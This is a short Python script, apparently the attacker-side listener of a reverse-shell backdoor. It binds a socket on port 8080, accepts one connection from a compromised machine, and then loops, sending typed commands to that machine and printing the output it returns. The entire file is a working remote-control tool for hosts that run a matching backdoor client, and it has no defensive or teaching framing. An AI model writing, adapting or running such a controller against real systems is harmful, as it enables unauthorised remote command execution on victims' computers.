import socket
import time

backdoor_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

backdoor_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

backdoor_listener.bind(("0.0.0.0",8080))

backdoor_listener.listen(1)

print("Listening...")

(connection,address) = backdoor_listener.accept()
print("Connection OK" + str(address))

while True:
	command = input("Enter command ")
	connection.sendall((command).encode())
	command_output = connection.recv(1024)
	print(command_output)
